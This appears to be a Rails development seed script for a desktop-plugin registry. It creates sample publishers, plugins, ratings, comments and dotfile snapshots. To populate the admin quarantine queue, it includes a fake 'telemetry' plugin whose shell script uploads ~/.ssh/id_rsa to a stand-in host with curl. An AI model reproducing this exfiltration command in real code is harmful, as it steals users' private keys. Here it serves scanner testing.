# Development seed data — runs plugins through the real publish pipeline so the
# data plane, index, and directory all exercise production code paths.
return if Rails.env.production?

require "rubygems/package"
require "zlib"

# A reset DB with a leftover data plane means stale frozen tarballs — wipe it
# so the seed run regenerates a coherent pair.
FileUtils.rm_rf(DataPlane.root)

def build_tarball(manifest, files)
  io = StringIO.new
  Zlib::GzipWriter.wrap(io) do |gz|
    Gem::Package::TarWriter.new(gz) do |tar|
      json = JSON.pretty_generate(manifest)
      tar.add_file_simple("manifest.json", 0o644, json.bytesize) { |f| f.write(json) }
      files.each do |path, content|
        tar.add_file_simple(path, 0o644, content.bytesize) { |f| f.write(content) }
      end
    end
  end
  io.string
end

admin = User.find_or_create_by!(email_address: "ryan@heyoodle.com") do |u|
  u.name = "Ryan Hughes"
  u.admin = true
  u.otp_secret = ROTP::Base32.random
  u.otp_enabled_at = Time.current
end
admin.update!(admin: true) unless admin.admin?

ryan = Publisher.find_or_create_by!(name: "ryanrhughes") { |p| p.kind = :personal }
Membership.find_or_create_by!(publisher: ryan, user: admin) { |m| m.role = :owner; m.founding = true }

SAMPLES = [
  { name: "weather", summary: "Current conditions and forecast in your bar, without the bloat.",
    kinds: [ "bar-widget" ], versions: %w[0.9.0 1.0.0 1.1.0] },
  { name: "pomodoro", summary: "A tomato timer that respects your focus and your bar space.",
    kinds: [ "bar-widget" ], versions: %w[1.0.0] },
  { name: "now-playing", summary: "MPRIS now-playing with scrubbing, artwork, and taste.",
    kinds: [ "bar-widget", "panel" ], versions: %w[0.5.0 0.6.0] }
]

SAMPLES.each do |sample|
  sample[:versions].each do |version|
    plugin = ryan.plugins.find_by(name: sample[:name])
    next if plugin&.version_burned?(version)

    manifest = {
      "schemaVersion" => 1,
      "id" => "ryanrhughes.#{sample[:name]}",
      "name" => sample[:name].titleize,
      "description" => sample[:summary],
      "version" => version,
      "kinds" => sample[:kinds],
      "entryPoints" => sample[:kinds].to_h { |k| [ Registry::ManifestValidator::KIND_ENTRY_RULES.fetch(k)[:key], "Widget.qml" ] },
      "license" => "MIT",
      "repository" => "https://github.com/ryanrhughes/#{sample[:name]}"
    }
    readme = <<~MD
      # #{sample[:name].titleize}

      #{sample[:summary]}

      ## Features

      - Zero configuration, sensible defaults
      - Follows your Omarchy theme
      - Tiny footprint
    MD
    bytes = build_tarball(manifest, { "Widget.qml" => "import QtQuick\nItem {}\n", "README.md" => readme })
    created = Registry::PublishVersion.new(user: admin, publisher: ryan, plugin_name: sample[:name], tarball_bytes: bytes).call
    Registry::ReviewJob.perform_now(created)
    puts "published ryanrhughes/#{sample[:name]}@#{version} (#{created.reload.state})"
  end
end

# ---------------------------------------------------------------------------
# A directory with only one publisher and three plugins doesn't show how the
# app behaves in the real world, so the catalog below is deliberately varied:
# several publishers (personal and org, claimed and not), every supported
# kind, a spread of licenses, ratings, comments, view/download counts, and the
# unhappy states — quarantined, yanked, revoked — so every UI branch has data.

COMMUNITY = [
  { email: "avery@example.com",  name: "Avery Lin" },
  { email: "kai@example.com",    name: "Kai Ndlovu" },
  { email: "sam@example.com",    name: "Sam Okafor" },
  { email: "juno@example.com",   name: "Juno Marsh" },
  { email: "petra@example.com",  name: "Petra Vogel" }
].map do |attrs|
  User.find_or_create_by!(email_address: attrs[:email]) do |u|
    u.name = attrs[:name]
    u.otp_secret = ROTP::Base32.random
    u.otp_enabled_at = Time.current
  end
end

def publisher_for(name, kind:, owner:, claimed: true)
  publisher = Publisher.find_or_create_by!(name: name) { |p| p.kind = kind }
  publisher.update!(claimed: claimed)
  Membership.find_or_create_by!(publisher: publisher, user: owner) do |m|
    m.role = :owner
    m.founding = true
  end
  publisher
end

lumen = publisher_for("lumenlabs", kind: :org, owner: COMMUNITY[0])
tidal = publisher_for("tidalworks", kind: :org, owner: COMMUNITY[1])
kai = publisher_for("kai", kind: :personal, owner: COMMUNITY[1])
juno = publisher_for("junomarsh", kind: :personal, owner: COMMUNITY[3])
petra = publisher_for("vogelworks", kind: :org, owner: COMMUNITY[4])
sam = publisher_for("sokafor", kind: :personal, owner: COMMUNITY[2])

CATALOG = [
  { publisher: lumen, name: "lumen-clock", summary: "A clock that knows when you are on call.",
    kinds: [ "bar-widget" ], license: "MIT", versions: %w[1.0.0 1.1.0 1.2.0],
    downloads: 18_402, views: 41_233, ratings: [ 5, 5, 4, 5, 4, 5 ] },
  { publisher: lumen, name: "spectrum", summary: "Audio spectrum in the bar, tuned for tiny heights.",
    kinds: [ "bar-widget" ], license: "Apache-2.0", versions: %w[0.4.0 0.5.0],
    downloads: 6_120, views: 12_880, ratings: [ 4, 4, 5, 3 ] },
  { publisher: lumen, name: "session-panel", summary: "Power, lock, and session actions in one panel.",
    kinds: [ "panel" ], license: "MIT", versions: %w[2.0.0 2.0.1],
    downloads: 9_755, views: 15_301, ratings: [ 5, 4, 4 ] },
  { publisher: tidal, name: "tide", summary: "Tide tables and surf conditions for your coastline.",
    kinds: [ "bar-widget", "panel" ], license: "BSD-3-Clause", versions: %w[0.9.0 1.0.0],
    downloads: 3_140, views: 8_002, ratings: [ 5, 4 ] },
  { publisher: tidal, name: "harbor", summary: "Docker and compose status without leaving your bar.",
    kinds: [ "bar-widget", "menu" ], license: "MPL-2.0", versions: %w[1.4.0 1.5.0 1.6.0],
    downloads: 22_908, views: 51_774, ratings: [ 5, 5, 5, 4, 5, 5, 3 ] },
  { publisher: kai, name: "focus-overlay", summary: "Dims everything but the window you are working in.",
    kinds: [ "overlay" ], license: "GPL-3.0-only", versions: %w[0.2.0],
    downloads: 812, views: 3_450, ratings: [ 4, 3 ] },
  { publisher: kai, name: "battery-guard", summary: "Warns before your laptop lies to you about battery.",
    kinds: [ "service" ], license: "MIT", versions: %w[1.0.0 1.0.1 1.1.0],
    downloads: 5_640, views: 9_120, ratings: [ 5, 4, 4, 5 ] },
  { publisher: juno, name: "wallpaper-cycle", summary: "Rotates wallpapers on a schedule you actually set.",
    kinds: [ "service" ], license: "ISC", versions: %w[3.1.0],
    downloads: 14_030, views: 27_600, ratings: [ 4, 5, 4, 4, 5 ] },
  { publisher: juno, name: "quick-notes", summary: "A scratchpad that opens faster than your editor.",
    kinds: [ "menu" ], license: "MIT", versions: %w[0.7.0 0.8.0],
    downloads: 2_205, views: 6_310, ratings: [ 4, 4 ] },
  { publisher: lumen, name: "lumen-notify", summary: "Notification history you can actually search.",
    kinds: [ "panel" ], license: "MIT", versions: %w[1.0.0 1.1.0],
    downloads: 11_240, views: 20_115, ratings: [ 5, 4, 5, 4 ] },
  { publisher: lumen, name: "keycast", summary: "Shows the keys you press, for screencasts and pairing.",
    kinds: [ "overlay" ], license: "Apache-2.0", versions: %w[0.3.0 0.4.0 0.4.1],
    downloads: 7_880, views: 14_002, ratings: [ 4, 5, 4 ] },
  { publisher: tidal, name: "anchor", summary: "Pins a window to every workspace, without the wrangling.",
    kinds: [ "service" ], license: "MIT", versions: %w[1.2.0],
    downloads: 4_410, views: 7_330, ratings: [ 4, 4, 5 ] },
  { publisher: tidal, name: "moorings", summary: "Saves and restores window layouts per project.",
    kinds: [ "menu", "service" ], license: "BSD-3-Clause", versions: %w[0.6.0 0.7.0],
    downloads: 6_902, views: 11_450, ratings: [ 5, 4, 4, 5, 4 ] },
  { publisher: kai, name: "cpu-thermals", summary: "Temperature and fan curves at a glance.",
    kinds: [ "bar-widget" ], license: "GPL-3.0-only", versions: %w[2.1.0 2.2.0],
    downloads: 13_570, views: 24_880, ratings: [ 5, 5, 4, 4, 5 ] },
  { publisher: kai, name: "vpn-status", summary: "Know which tunnel you are on before you paste the secret.",
    kinds: [ "bar-widget" ], license: "MIT", versions: %w[1.0.0 1.0.1],
    downloads: 8_120, views: 13_990, ratings: [ 5, 4 ] },
  { publisher: juno, name: "moon-phase", summary: "The moon, in your bar, for no practical reason.",
    kinds: [ "bar-widget" ], license: "ISC", versions: %w[1.0.0],
    downloads: 1_980, views: 5_240, ratings: [ 5, 5, 4 ] },
  { publisher: juno, name: "clipboard-well", summary: "Clipboard history with fuzzy search and pinning.",
    kinds: [ "menu", "service" ], license: "MIT", versions: %w[2.0.0 2.1.0 2.2.0],
    downloads: 19_775, views: 38_400, ratings: [ 5, 5, 5, 4, 5, 4 ] },
  { publisher: petra, name: "gitline", summary: "Branch, dirty state, and CI status for the repo you are in.",
    kinds: [ "bar-widget" ], license: "MPL-2.0", versions: %w[1.3.0 1.4.0],
    downloads: 16_330, views: 29_770, ratings: [ 5, 5, 4, 5 ] },
  { publisher: petra, name: "standup", summary: "Nudges you to stand up, politely, then insistently.",
    kinds: [ "service" ], license: "MIT", versions: %w[0.9.0],
    downloads: 3_505, views: 7_002, ratings: [ 3, 4, 4 ] },
  { publisher: petra, name: "palette-peek", summary: "Eyedropper and palette inspector for the whole screen.",
    kinds: [ "overlay", "menu" ], license: "Apache-2.0", versions: %w[0.5.0 0.5.1],
    downloads: 5_240, views: 10_880, ratings: [ 4, 5 ] },
  { publisher: sam, name: "pomo-panel", summary: "The pomodoro timer, expanded into a full session panel.",
    kinds: [ "panel" ], license: "MIT", versions: %w[1.0.0 1.1.0],
    downloads: 9_060, views: 17_220, ratings: [ 4, 4, 5, 4 ] },
  { publisher: sam, name: "disk-watch", summary: "Warns before the disk fills, not after the build fails.",
    kinds: [ "service" ], license: "ISC", versions: %w[1.0.0 1.0.1 1.0.2],
    downloads: 12_400, views: 21_640, ratings: [ 5, 4, 5 ] },
  { publisher: sam, name: "scratch-term", summary: "A drop-down terminal that remembers where it was.",
    kinds: [ "overlay" ], license: "GPL-3.0-only", versions: %w[3.0.0],
    downloads: 21_090, views: 44_310, ratings: [ 5, 5, 5, 4, 5 ] }
]

COMMENT_BODIES = [
  "Replaced three of my dotfile hacks with this. Thank you.",
  "Works exactly as described. The defaults are sensible out of the box.",
  "Any chance of a config option for the refresh interval?",
  "Been running this for a month, zero crashes.",
  "The theme integration is the detail that sold me.",
  "Small footprint and it does one thing well.",
  "Had a rough edge on multi-monitor, latest release fixed it."
]

def seed_widget_files(summary)
  {
    "Widget.qml" => "import QtQuick\nItem { /* #{summary} */ }\n",
    "README.md" => <<~MD
      # #{summary}

      Installs from the registry, lands disabled, and follows your Omarchy theme.

      ## Features

      - Zero configuration, sensible defaults
      - Follows your Omarchy theme
      - Tiny footprint

      ## Settings

      | Key | Default | What it does |
      | --- | --- | --- |
      | `refreshSeconds` | `30` | How often it refreshes |
    MD
  }
end

CATALOG.each do |entry|
  owner = entry[:publisher].memberships.first.user
  entry[:versions].each do |version|
    plugin = entry[:publisher].plugins.find_by(name: entry[:name])
    next if plugin&.version_burned?(version)

    manifest = {
      "schemaVersion" => 1,
      "id" => "#{entry[:publisher].name}.#{entry[:name]}",
      "name" => entry[:name].titleize,
      "description" => entry[:summary],
      "version" => version,
      "kinds" => entry[:kinds],
      "entryPoints" => entry[:kinds].to_h { |k|
        [ Registry::ManifestValidator::KIND_ENTRY_RULES.fetch(k)[:key],
          k == "service" ? "service.sh" : "Widget.qml" ]
      },
      "license" => entry[:license],
      "repository" => "https://github.com/#{entry[:publisher].name}/#{entry[:name]}"
    }
    files = seed_widget_files(entry[:summary])
    files["service.sh"] = "#!/bin/bash\necho #{entry[:name]}\n" if entry[:kinds].include?("service")
    bytes = build_tarball(manifest, files)
    created = Registry::PublishVersion.new(user: owner, publisher: entry[:publisher],
      plugin_name: entry[:name], tarball_bytes: bytes).call
    Registry::ReviewJob.perform_now(created)
  end

  plugin = entry[:publisher].plugins.find_by!(name: entry[:name])
  plugin.update!(downloads_count: entry[:downloads], views_count: entry[:views])

  entry[:ratings].each_with_index do |value, i|
    rater = COMMUNITY[i % COMMUNITY.length]
    Rating.find_or_create_by!(plugin: plugin, user: rater) { |r| r.value = value }
  end

  entry[:ratings].first(3).each_with_index do |_, i|
    commenter = COMMUNITY[(i + 1) % COMMUNITY.length]
    body = COMMENT_BODIES[(plugin.id + i) % COMMENT_BODIES.length]
    next if Comment.exists?(plugin: plugin, user: commenter, body: body)
    Comment.create!(plugin: plugin, user: commenter, body: body, created_at: (i + 1).days.ago)
  end

  puts "seeded #{plugin.full_name} (#{plugin.versions.count} versions, #{entry[:ratings].length} ratings)"
end

# --- Unhappy paths so the admin queue and warning states are not empty ------

# 1. A version the scanner quarantined: exfiltration-shaped source.
sketchy = build_tarball(
  { "schemaVersion" => 1, "id" => "junomarsh.telemetry", "name" => "Telemetry",
    "description" => "Collects a little more than it should.", "version" => "0.1.0",
    "kinds" => [ "service" ], "entryPoints" => { "service" => "service.sh" },
    "license" => "MIT", "repository" => "https://github.com/junomarsh/telemetry" },
  { "service.sh" => "#!/bin/bash\ncurl -s -T ~/.ssh/id_rsa https://drop.example.com/x\n",
    "README.md" => "# Telemetry\n\nNothing to see here.\n" })
begin
  flagged = Registry::PublishVersion.new(user: COMMUNITY[3], publisher: juno,
    plugin_name: "telemetry", tarball_bytes: sketchy).call
  Registry::ReviewJob.perform_now(flagged)
  puts "seeded junomarsh/telemetry@0.1.0 (#{flagged.reload.state}) — admin queue"
rescue Registry::PublishVersion::PublishError => e
  puts "junomarsh/telemetry rejected at submit: #{e.message}"
end

# 2. A yanked version: the publisher pulled a bad release, newer one is live.
harbor = tidal.plugins.find_by!(name: "harbor")
if (bad = harbor.versions.published.order(:id).first)
  bad.yank!(reason: "Broke on compose v2", actor: COMMUNITY[1])
  puts "yanked #{harbor.full_name}@#{bad.version}"
end

# 3. A revoked (kill-bit) version so revocations.json isn't empty.
focus = kai.plugins.find_by!(name: "focus-overlay")
if (killed = focus.versions.published.order(:id).first)
  Revocation.find_or_create_by!(plugin: focus, version: killed.version) do |r|
    r.reason = "Shipped a keylogger in a patch release"
    r.created_by = admin
  end
  puts "revoked #{focus.full_name}@#{killed.version}"
end

# 4. A report awaiting moderation.
if (reported = juno.plugins.find_by(name: "quick-notes"))
  Report.find_or_create_by!(reportable: reported, user: COMMUNITY[2]) do |r|
    r.reason = "Possible license mismatch with upstream"
  end
  puts "reported #{reported.full_name}"
end

# 5. An UNCLAIMED, catalog-seeded namespace: this is how omarchyplugins.com
# listings enter the registry before their authors claim them. Snapshot is
# injected so seeding stays offline in dev.
CATALOG_ENTRIES = [
  { "publisher" => "driftco", "name" => "driftboard",
    "summary" => "Sticky notes for the desktop, awaiting a claim.",
    "repository" => "https://github.com/driftco/driftboard" },
  { "publisher" => "driftco", "name" => "cursor-trails",
    "summary" => "Comet trails behind your cursor. Yes, really.",
    "repository" => "https://github.com/driftco/cursor-trails" }
]

fake_snapshot = lambda do |repository|
  name = repository.to_s.split("/").last
  build_tarball(
    { "schemaVersion" => 1, "id" => "driftco.#{name}", "name" => name.titleize,
      "description" => "Seeded from the community catalog.", "version" => "0.1.0",
      "kinds" => [ "panel" ], "entryPoints" => { "panel" => "Widget.qml" },
      "license" => "MIT", "repository" => repository },
    seed_widget_files("Seeded from the community catalog."))
end

Registry::SeedCatalog.import(CATALOG_ENTRIES, snapshotter: fake_snapshot).each do |result|
  entry = result[:entry]
  puts "catalog-seeded #{entry['publisher']}/#{entry['name']}: #{result[:status]}#{" — #{result[:reason]}" if result[:reason]}"
end
Registry::ReviewJob.perform_now(PluginVersion.processing.last) while PluginVersion.processing.any?

DataPlane::Regenerate.all
puts "Seeded. Admin: ryan@heyoodle.com (passwordless — request a code in dev, it shows in the flash)."
puts "Admin TOTP secret (add to your authenticator for step-up): #{admin.otp_secret}"

# ---------------------------------------------------------------------------
# My Omarchy: a connected device, a couple of config snapshots, and a handful
# of shared snaps (real Omarchy screenshots from the manual, db/seeds/snaps)
# so the hub has something worth looking at.
my_device = admin.api_tokens.usable.purpose_account.find_by(device_name: "xps-14") ||
  ApiToken.mint!(user: admin, purpose: :account, device_name: "xps-14")
my_device.update!(last_used_at: 12.minutes.ago)
desktop = admin.api_tokens.usable.purpose_account.find_by(device_name: "studio") ||
  ApiToken.mint!(user: admin, purpose: :account, device_name: "studio")
desktop.update!(last_used_at: 3.days.ago, created_at: 40.days.ago)
admin.update!(verified_at: Time.current) if admin.verified_at.nil?

def build_plain_tarball(files)
  io = StringIO.new
  Zlib::GzipWriter.wrap(io) do |gz|
    Gem::Package::TarWriter.new(gz) do |tar|
      files.each { |path, content| tar.add_file_simple(path, 0o644, content.bytesize) { |f| f.write(content) } }
    end
  end
  io.string
end

if admin.dotfile_bundles.none?
  base = {
    ".config/omarchy/shell.json" => %({ "bar": { "position": "top" } }\n),
    ".config/omarchy/branding/about.txt" => "omarchy\n",
    ".config/hypr/bindings.lua" => %(o.bind("SUPER + RETURN", "Terminal", "ghostty")\n),
    ".config/hypr/monitors.lua" => %(hl.monitor({ name = "eDP-1", scale = 1.5 })\n),
    ".config/hypr/looknfeel.lua" => "hl.decoration({ rounding = 0 })\n",
    ".config/ghostty/config" => "font-size = 13\ntheme = tokyo-night\n",
    ".config/alacritty/alacritty.toml" => "[font]\nsize = 13\n",
    ".config/starship.toml" => "add_newline = false\n",
    ".config/lazygit/config.yml" => "gui:\n  nerdFontsVersion: \"3\"\n",
    ".config/tmux/tmux.conf" => "set -g mouse on\n"
  }
  [
    [ desktop, 9.days.ago, base.merge(".config/hypr/monitors.lua" => %(hl.monitor({ name = "DP-1", scale = 1 })\n)) ],
    [ my_device, 2.days.ago, base ],
    [ my_device, 12.minutes.ago, base.merge(".config/ghostty/config" => "font-size = 14\ntheme = tokyo-night\n") ]
  ].each do |token, at, files|
    bundle = MyOmarchy::DotfileSync.new(user: admin, bytes: build_plain_tarball(files), token: token,
      device_name: token.device_name, declared_manifest: { "omarchy_version" => "4.1.0" }).call
    bundle.update_columns(created_at: at, updated_at: at)
  end
end

if admin.snaps.none?
  [
    [ "navigation-fourway-tiling.webp", "Four-way tiling on the 14\"", "7d", 3.hours.ago, 41 ],
    [ "clipboard-history.webp", "Clipboard history search", nil, 1.day.ago, 118 ],
    [ "notice-weather.webp", "Weather notice, new layout", "7d", 2.days.ago, 7 ],
    [ "prompt.webp", "Prompt after the starship tweak", nil, 5.days.ago, 22 ],
    [ "snapshots-restore.webp", "Restoring a snapshot from limine", "30d", 9.days.ago, 263 ],
    [ "tmux-tdl.webp", "tmux layout for the pkgs review", nil, 16.days.ago, 9 ]
  ].each do |file, title, ttl, at, views|
    bytes = File.binread(Rails.root.join("db/seeds/snaps", file))
    snap = MyOmarchy::SnapUpload.new(user: admin, bytes: bytes, content_type: "image/webp", title: title, ttl: ttl,
      token: my_device, device_name: "xps-14").call
    snap.update_columns(created_at: at, updated_at: at, views_count: views,
      expires_at: (ttl ? at + Snap::TTL_OPTIONS.fetch(ttl) : nil))
  end
end
puts "My Omarchy: #{admin.devices.count} devices, #{admin.dotfile_bundles.count} snapshots, #{admin.snaps.live.count} snaps for #{admin.email_address}."
